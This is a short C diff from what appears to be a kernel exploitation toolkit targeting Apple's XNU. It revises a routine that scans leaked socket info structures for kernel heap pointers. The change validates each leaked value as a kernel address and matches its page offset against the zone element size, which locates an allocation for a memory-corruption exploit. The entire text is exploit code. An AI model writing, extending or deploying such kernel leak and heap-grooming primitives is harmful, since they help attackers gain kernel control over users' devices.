@@ -157,11 +157,17 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
         }
         
         for (int i = 0; i < num_modified; i++) {
-            uintptr_t* addr = (uintptr_t*)&modified[i].psi.soi_proto.pri_un.unsi_addr.ua_sun;
+            uintptr_t* addrs = (uintptr_t*)&modified[i].psi.soi_proto.pri_un.unsi_addr.ua_sun;
             for (int j = 0; j < 32; j += 4) {
+                uintptr_t addr = addrs[j];
+                if (!XE_VM_KERNEL_ADDRESS_VALID(addr)) {
+                    continue;
+                }
+                // assuming z_chunk_pages = 1
+                uintptr_t page_local = addr & (XE_PAGE_SIZE - 1);
                 // may need to be improved for smaller alloc size
-                if (addr[j] != 0 && addr[j] % zone_size == 0) {
-                    out->address = addr[j];
+                if (page_local % zone_size == 0) {
+                    out->address = addrs[j];
                     out->element_allocator = element_allocator;
                     error = 0;
                     goto done;
